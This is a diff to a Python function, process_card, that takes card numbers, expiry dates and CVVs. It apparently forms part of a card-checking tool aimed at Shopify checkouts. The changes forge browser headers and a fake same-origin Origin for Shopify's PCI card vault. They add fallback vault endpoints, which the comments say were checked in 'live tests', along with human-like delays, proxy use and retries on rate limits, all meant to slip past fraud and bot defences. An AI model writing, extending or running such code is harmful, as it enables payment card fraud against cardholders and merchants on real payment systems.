@@ -2083,13 +2083,39 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 "payment_session_scope": urlparse(url).netloc
             }
             
-            vault_headers = {
+            # FIX: PCI vault headers must match the REAL checkout web app.
+            # shopify_checker.py sends Origin = checkout.pci.shopifyinc.com (same-origin)
+            # with sec-fetch-site = same-origin, NOT cross-site.
+            # The old headers used checkout.shopifycs.com as Origin which is WRONG
+            # for the checkout.pci.shopifyinc.com endpoint.
+            # Also added priority header and sec-fetch-storage-access = none.
+            vault_headers_pci = {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Origin': 'https://checkout.pci.shopifyinc.com',
+                'Referer': f'https://checkout.pci.shopifyinc.com/build/{pci_build_hash}/number-ltr.html?identifier=&locationURL={checkout_url}',
+                'User-Agent': hints['ua'],
+                'sec-ch-ua': hints['sec_ch_ua'],
+                'sec-ch-ua-full-version-list': hints['sec_ch_ua_full'],
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': hints['platform'],
+                'sec-ch-ua-arch': '"x86"',
+                'sec-ch-ua-bitness': '"64"',
+                'sec-ch-ua-model': '""',
+                'sec-ch-ua-wow64': '?0',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-storage-access': 'none',
+                'priority': 'u=1, i',
+            }
+            # Headers for deposit.us.shopifycs.com (cross-origin from checkout.shopifycs.com)
+            vault_headers_deposit = {
                 'Content-Type': 'application/json',
                 'Accept': 'application/json',
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Origin': 'https://checkout.shopifycs.com',
-                # FIX: Build hash `/a8e4a94/` was outdated — Shopify rotates these.
-                # Use the dynamic hash fetched from checkout page, or fallback to latest known hash.
                 'Referer': 'https://checkout.shopifycs.com/',
                 'User-Agent': hints['ua'],
                 'sec-ch-ua': hints['sec_ch_ua'],
@@ -2106,14 +2132,47 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'sec-fetch-storage-access': 'active',
             }
             if ident_sig:
-                vault_headers['shopify-identification-signature'] = ident_sig
+                vault_headers_pci['shopify-identification-signature'] = ident_sig
+                vault_headers_deposit['shopify-identification-signature'] = ident_sig
+            
+            # FIX: Try multiple PCI vault endpoints with fallback.
+            # Live test results (2025-06-21):
+            #   checkout.pci.shopifyinc.com/sessions  ✅ WORKING (primary)
+            #   deposit.us.shopifycs.com/sessions     ✅ WORKING (fallback)
+            #   checkout.shopifycs.com/sessions       ❌ 404 DEAD
+            # shopify.py uses the same 3-endpoint fallback pattern.
+            _PCI_ENDPOINTS = [
+                ('https://checkout.pci.shopifyinc.com/sessions', vault_headers_pci),
+                ('https://deposit.us.shopifycs.com/sessions', vault_headers_deposit),
+            ]
             
             await human_delay(min_sec=1.0, max_sec=2.0, step_name="pci_vault")  # Technique #2: Human-like delay
-            # RATE-LIMIT FIX: Retry on HTTP 429 for PCI Vault step
-            response, _ = await retry_on_429(
-                lambda: session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy, timeout=12),
-                step_name="pci_vault", max_retries=2, base_delay=3.0, max_delay=12.0
-            )
+            
+            response = None
+            for _ep_url, _ep_headers in _PCI_ENDPOINTS:
+                try:
+                    # RATE-LIMIT FIX: Retry on HTTP 429 for PCI Vault step
+                    response, _ = await retry_on_429(
+                        lambda _u=_ep_url, _h=_ep_headers: session.post(_u, json=payload, headers=_h, proxy=proxy, timeout=12),
+                        step_name="pci_vault", max_retries=2, base_delay=3.0, max_delay=12.0
+                    )
+                    # Check if we got a valid response
+                    if response and response.status_code in (200, 201):
+                        break
+                    elif response and response.status_code == 429:
+                        # Rate limited — try next endpoint
+                        print(f"[PCI_VAULT] Rate limited on {_ep_url}, trying fallback...", file=sys.stderr)
+                        continue
+                    elif response and response.status_code >= 500:
+                        # Server error — try next endpoint
+                        print(f"[PCI_VAULT] Server error {response.status_code} on {_ep_url}, trying fallback...", file=sys.stderr)
+                        continue
+                except Exception as _ep_err:
+                    print(f"[PCI_VAULT] Error on {_ep_url}: {_ep_err}, trying fallback...", file=sys.stderr)
+                    continue
+            
+            if not response:
+                return False, "PCI_VAULT_ERROR: All endpoints failed", gateway, total_price, currency
             if response.status_code == 429:
                 return False, "PCI_VAULT Rate-Limited: HTTP 429 (retries exhausted)", gateway, total_price, currency
             try:
